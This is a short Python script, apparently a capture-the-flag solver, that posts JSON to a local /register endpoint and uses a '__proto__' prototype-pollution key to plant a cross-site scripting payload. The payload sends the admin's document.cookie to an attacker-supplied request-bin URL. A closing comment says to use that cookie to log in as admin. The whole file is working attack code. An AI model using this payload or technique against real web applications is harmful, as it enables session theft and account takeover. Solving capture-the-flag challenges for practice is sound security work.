import requests
import sys

if len(sys.argv) != 2:
    print("python3 solve.py <request_bin>")
else:
    payload = "<img src=x onerror=this.src='" + sys.argv[1] + "?admin='+document.cookie>"

    data = {
        "rperiod":"44",
        "rtype":"t",
        "name":"d",
        "address":{
            "streetAddress":"d",
            "city":"d",
            "province":"d",
            "country":"d",
            "__proto__": { # < Prototype Pollution 
                "planet":payload
            }
        },
        "year":"2",
        "make":"d",
        "model":"d",
        "color":"dd"
    }

    r = requests.post("http://localhost:8000/register", json=data)
    print(r.text)
# You can see the admin's cookie in requestbin and use it to login as admin and grab flag!